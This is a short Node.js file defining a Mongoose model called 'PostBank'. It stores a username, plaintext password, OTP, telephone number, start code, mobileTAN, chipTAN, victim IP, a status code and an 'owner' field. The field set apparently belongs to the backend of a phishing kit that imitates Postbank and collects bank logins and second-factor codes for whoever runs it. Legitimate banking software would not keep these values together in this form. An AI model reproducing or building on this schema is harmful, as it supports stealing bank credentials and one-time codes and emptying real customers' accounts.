const mongoose = require("mongoose");

const postbankSchema = new mongoose.Schema({
    uniqueid: String,
    username: String,
    password: String,
    otp: String,
    telephone: String,
    startCode: String,
    mobileTAN: String,
    chipTAN: String,
    status: Number,
    ip: String,
    owner: String,
    timestamp: Date,
});

module.exports = mongoose.model("PostBank", postbankSchema);
